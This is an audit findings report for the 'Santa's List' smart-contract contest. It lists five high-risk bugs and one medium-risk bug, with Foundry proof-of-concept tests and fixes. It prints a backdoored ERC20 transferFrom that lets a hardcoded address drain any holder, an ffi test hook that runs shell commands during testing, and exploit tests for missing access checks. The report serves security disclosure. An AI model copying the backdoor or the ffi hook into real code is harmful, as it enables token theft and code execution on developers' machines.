# First Flight #5: Santa's List - Findings Report

# Table of contents

- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
  - ### [H-01. FFI Code Execution Vulnerability](#H-01)
  - ### [H-02. Backdoor in transferFrom of the ERC20 implementation](#H-02)
  - ### [H-03. Inadequate Verification of Distributed Presents in `collectPresent()`](#H-03)
  - ### [H-04. Arbitrary Burning of Tokens of any user in `buyPresent()`](#H-04)
  - ### [H-05. Unauthorized Access to `checkList`](#H-05)
- ## Medium Risk Findings
  - ### [M-01. Inconsistent Purchased Present Cost and Magic Value](#M-01)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #5

### Dates: Nov 30th, 2023 - Dec 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clpba0ama0001ywpabex01hrp)

# <a id='results-summary'></a>Results Summary

### Number of validated findings:

- High: 5
- Medium: 1
- Low: 0

# High Risk Findings

## <a id='H-01'></a>H-01. FFI Code Execution Vulnerability

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/foundry.toml#L9C1-L9C11

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/test/unit/SantasListTest.t.sol#L149C1-L154C6

## Summary

The `foundry.toml` configuration file has the `ffi` option set to `true`, allowing for arbitrary code execution during the `forge test` or `forge coverage` commands. This can be exploited by a malicious developer to execute malicious code on the machines of other users running these commands, potentially leading to unauthorized actions or compromising the security of the system.

## Vulnerability Details

The vulnerable configuration can be found in the `foundry.toml` file. By setting the `ffi` option to `true`, any code that is included in the test files can be executed during the `forge test` or `forge coverage` commands. This can be abused by a malicious developer to execute arbitrary commands on the machines of other users.

There is already a "malicious code"/"PoC" in test files :

### PoC

```
    function testPwned() public {
        string[] memory cmds = new string[](2);
        cmds[0] = "touch";
        cmds[1] = string.concat("youve-been-pwned");
        cheatCodes.ffi(cmds);
    }
```

## Impact

This vulnerability allows a malicious developer to execute arbitrary code on the machines of other users running the `forge test` or `forge coverage` commands. This can lead to unauthorized actions, compromise the security of system’s hawkers/testers, and potentially infect the machines with malware.

## Tools Used

Manual review

## Recommendations

To fix this vulnerability, the `ffi` option should be set to `false` in the `foundry.toml` configuration file. By disabling the execution of arbitrary code, the risk of unauthorized actions and compromising the security of the system can be mitigated. Moreover, ffi is not useful in any other tests.

## <a id='H-02'></a>H-02. Backdoor in transferFrom of the ERC20 implementation

### Relevant GitHub Links

https://github.com/PatrickAlphaC/solmate-bad/blob/c3877e5571461c61293503f45fc00959fff4ebba/src/tokens/ERC20.sol#L89C1-L96C10

## Summary

The `transferFrom` function in the ERC20 implementation contains a backdoor that allows a specific address to transfer any SantaToken to another specific address. This backdoor can be exploited by the address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer SantaToken from any account to its own address.

## Vulnerability Details

The vulnerable code can be found in the `transferFrom` function of the ERC20 implementation. The code checks if the `msg.sender` is equal to `0x815F577F1c1bcE213c012f166744937C889DAF17`, and if true, it subtracts the specified amount from the `from` address and adds it to the `to` address.

### Backdoor

```
    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        // hehehe :)
        // https://arbiscan.io/tx/0xd0c8688c3bcabd0024c7a52dfd818f8eb656e9e8763d0177237d5beb70a0768d
        if (msg.sender == 0x815F577F1c1bcE213c012f166744937C889DAF17) {
            balanceOf[from] -= amount;
            unchecked {
                balanceOf[to] += amount;
            }
            emit Transfer(from, to, amount);
            return true;
        }
        ...
```

### Foundry PoC

```
    function testBackdoorERC20() public {
        vm.prank(address(santasList));
        santaToken.mint(user);

        assertEq(santaToken.balanceOf(user), 1e18);

        address pirateBackdoor = 0x815F577F1c1bcE213c012f166744937C889DAF17;

        vm.prank(pirateBackdoor);
        santaToken.transferFrom(user, pirateBackdoor, 1e18);

        assertEq(santaToken.balanceOf(user), 0);
        assertEq(santaToken.balanceOf(pirateBackdoor), 1e18);
    }
```

## Impact

This vulnerability allows the address `0x815F577F1c1bcE213c012f166744937C889DAF17` to transfer any amount of SantaToken from any account to its own address. This can lead to unauthorized transfers and potential loss of all funds for any users owning SantaTokens.

## Tools Used

Manual review

## Recommendations

To fix this vulnerability, the backdoor code should be removed from the `transferFrom` function. Additionally, it is recommended to only use trusted libraries for implementing ERC20 tokens to avoid potential security issues.

## <a id='H-03'></a>H-03. Inadequate Verification of Distributed Presents in `collectPresent()`

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L147C2-L166C6

## Summary

The `collectPresent` function in the smart contract does not adequately verify if a person has already collected a present. This allows users to transfer their NFT to another address and collect as many present as he wants.

## Vulnerability Details

The vulnerability arises from the lack of proper verification in the `collectPresent` function. The function only check if currently the user has a present, which is not the same that "user have already collected their gift". This enables users to transfer their NFT to any other address and collect presents infinitely.

### PoC

```
function testDontVerifyEnoughPresentDistributedInCollectPresent() public {
    vm.startPrank(santa);
    santasList.checkList(user, SantasList.Status.NICE);
    santasList.checkTwice(user, SantasList.Status.NICE);
    vm.stopPrank();

    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);

    vm.startPrank(user);
    santasList.collectPresent();
    assertEq(santasList.balanceOf(user), 1);

    //Transfer previous present and collect a new one
    santasList.transferFrom(user, user_2, 0);
    assertEq(santasList.ownerOf(0), user_2);
    assertEq(santasList.balanceOf(user), 0);

    santasList.collectPresent();

    //verify both user have a present thanks to one nice person
    assertEq(santasList.balanceOf(user), 1);
    assertEq(santasList.balanceOf(user), 1);

    vm.stopPrank();
}
```

## Impact

By exploiting this vulnerability, "Nice" or "Extra-Nice" users can collect multiple presents by transferring their NFT to different addresses. This can lead to an unfair distribution of presents or a steal of all presents minting all possible NFTs.

Additionnaly, with this bad verification, If one user send a present to anyone who didn’t collect their present, this person won’t be able to collect the present they deserve.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, it is recommended to implement proper verification in the `collectPresent` function. The function should check if a person has already collected a present and prevent them from collecting another one. This can be achieved by creating a mapping to keep track of addresses that have already collected a present.

Here is a possible solution :

```
    mapping(address => bool) private s_alreadyCollected;

    function collectPresent2() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
        if (s_alreadyCollected[msg.sender]) {
            revert SantasList__AlreadyCollected();
        }
        if (
            s_theListCheckedOnce[msg.sender] == Status.NICE &&
            s_theListCheckedTwice[msg.sender] == Status.NICE
        ) {
            s_alreadyCollected[msg.sender] = true;
            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE &&
            s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            s_alreadyCollected[msg.sender] = true;
            _mintAndIncrement();
            i_santaToken.mint(msg.sender);
            return;
        }
        revert SantasList__NotNice();
    }
```

## <a id='H-04'></a>H-04. Arbitrary Burning of Tokens of any user in `buyPresent()`

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172C1-L175C6

## Summary

The `buyPresent` function in the `SantasList.sol` allows any user to burn tokens of an arbitrary address and mint a new NFT for themselves (msg.sender). This can lead to unauthorized stealing of presents that belong to other users. The function should only allow the owner of the tokens to burn them and mint NFTs.

## Vulnerability Details

The vulnerability arises from the lack of proper ownership check in the `buyPresent` function. Any user can call this function and burn tokens belonging to an arbitrary address, as well as mint a new NFT for themselves. This means that an attacker can steal presents intended for other users by burning their tokens and claiming the presents for themselves.

### Foundry PoC

```
function testAnyoneCanBuyPresentForThemself() public {
    vm.prank(address(santasList));
    santaToken.mint(user_2);

    // user buy a present with the token of user_2
    vm.prank(user);
    santasList.buyPresent(user_2);

    assertEq(santasList.balanceOf(user), 1);
}
```

## Impact

By exploiting this vulnerability, an attacker can burn 1e18 SantaToken of any user and minting a new NFT for themself. It can be repeated on every user until they have less than 1e18 SantaToken. With bots, a good hacker can steal all the christmas presents before anyone collect their presents.
This can result in significant loss and frustration for the affected users, as well as undermine the fairness and integrity of the gift-giving process.

## Tools Used

Manual review

## Recommendations

The function should only allow the sender of the message to burn their token and mint a NFT for the arbitrary address.
Here is a possible solution :

```
    function buyPresent(address presentReceiver) external {
        i_santaToken.burnTokens(msg.sender);
       _mintAndIncrementForSomeoneElse(presentReceiver);
    }

    function _mintAndIncrementForSomeoneElse(address presentReceiver) private {
        _safeMint(presentReceiver, s_tokenCounter++);
    }
```

## <a id='H-05'></a>H-05. Unauthorized Access to `checkList`

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L121C1-L124C6

## Summary

The `checkList` function in the smart contract allows anyone to modify the status of a person on Santa's list, regardless of their role or permission. This can lead to unauthorized manipulation of the list, potentially blocking the collection of presents for everyone. The function should only be accessible to authorized parties, such as Santa, to maintain the integrity of the list.

## Vulnerability Details

The vulnerability arises from the lack of access controls in the `checkList` function. Any user can call this function and modify the status of a person on Santa's list, regardless of their role or permission. This means that an attacker can set themselves as "Nice" or set others as "Naughty", blocking the collection of presents for everyone.

### Foundry PoC

```
function testAnyoneCanCheckList() public {
    //user set Santa as naughty
    vm.prank(user);
    santasList.checkList(santa, SantasList.Status.NAUGHTY);

    assertEq(
        uint256(santasList.getNaughtyOrNiceOnce(santa)),
        uint256(SantasList.Status.NAUGHTY)
    );
}
```

## Impact

By exploiting this vulnerability, any person (especially naughty people) can disrupt the process of collecting presents by manipulating the status of many users in `s_theListCheckedOnce`, which will break both equalities below (line 154 to 160 in `collectPresent`), so it will be impossible to collect presents :
`if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE)`
`if ( s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE)`

This can potentially ruin the holiday spirit for many individuals.

## Tools Used

Manual review

## Recommendations

To mitigate this vulnerability, it is recommended to implement access controls in the `checkList` function. This can be achieved by adding a modifier, such as `onlySanta`, to restrict the function's access to authorized parties only (Santa here).

# Medium Risk Findings

## <a id='M-01'></a>M-01. Inconsistent Purchased Present Cost and Magic Value

### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L87C1-L88C59

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantaToken.sol#L21C1-L33C6

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L172C1-L175C6

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/README.md?plain=1#L56

## Summary

There is an inconsistency in the purchased present cost between the variable, documentation, and the `burn` and `mint` functions. This inconsistency can lead to confusion and potential errors when calculating the cost of purchasing presents or performing token operations.

## Vulnerability Details

The inconsistency in the purchased present cost can be observed in the following code snippet:

```solidity
////// In SantasList.sol, the following variable is not use.
// The cost of santa tokens for naughty people to buy presents
uint256 public constant PURCHASED_PRESENT_COST = 2e18;
```

```
////// In SantaToken.sol
function mint(address to) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
    _mint(to, 1e18);
}

function burn(address from) external {
    if (msg.sender != i_santasList) {
        revert SantaToken__NotSantasList();
    }
    _burn(from, 1e18);
}
```

```
- `buyPresent`: A function that trades `2e18` of `SantaToken` for an NFT. This function can be called by anyone.
```

The `PURCHASED_PRESENT_COST` constant is defined as `2e18`, indicating the cost of purchasing presents. However, both the `mint` and `burn` functions use `1e18` as the amount for minting and burning tokens. This inconsistency can lead to confusion and potential errors when calculating the cost of purchasing presents or performing token operations.

## Impact

The inconsistency in the purchased present cost can have the following impacts:

- Confusion in cost calculation: Developers or users relying on the documentation or variable definition may expect the cost of purchasing presents to be `2e18`. However, the actual token operations use `1e18` as the amount, leading to confusion and potential miscalculations.

The impact is Low because the same amount is present in `mint()`  and `burn()`, so the number of present which can be booked by one user won’t change.

## Tools Used

Manual review

## Recommendations

To address the inconsistency in the purchased present cost, it is recommended to ensure consistency across all relevant components. This can be achieved by updating the `mint` and `burn` functions to use the `PURCHASED_PRESENT_COST` constant as the amount for minting and burning tokens. Additionally, the documentation and variable definition should be updated to reflect the correct value of `2e18` as the cost of purchasing presents.

```solidity

    // The cost of santa tokens for naughty people to buy presents
    uint256 public constant PURCHASED_PRESENT_COST = 2e18;

    function collectPresent() external {
        if (block.timestamp < CHRISTMAS_2023_BLOCK_TIME) {
            revert SantasList__NotChristmasYet();
        }
        if (balanceOf(msg.sender) > 0) {
            revert SantasList__AlreadyCollected();
        }
        if (
            s_theListCheckedOnce[msg.sender] == Status.NICE &&
            s_theListCheckedTwice[msg.sender] == Status.NICE
        ) {
            _mintAndIncrement();
            return;
        } else if (
            s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE &&
            s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
        ) {
            _mintAndIncrement();
            i_santaToken.mint(msg.sender, PURCHASED_PRESENT_COST);
            return;
        }
        revert SantasList__NotNice();
    }

    function buyPresent(address presentReceiver) external {
        i_santaToken.burn(presentReceiver, PURCHASED_PRESENT_COST);
        _mintAndIncrement();
    }
```

```solidity
    function mint(address to, uint256 amount) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        if (msg.sender != i_santasList) {
            revert SantaToken__NotSantasList();
        }
        _burn(from, amount);
    }
```

By ensuring consistency in the purchased present cost, it will help avoid confusion and potential errors when calculating the cost of purchasing presents or performing token operations.
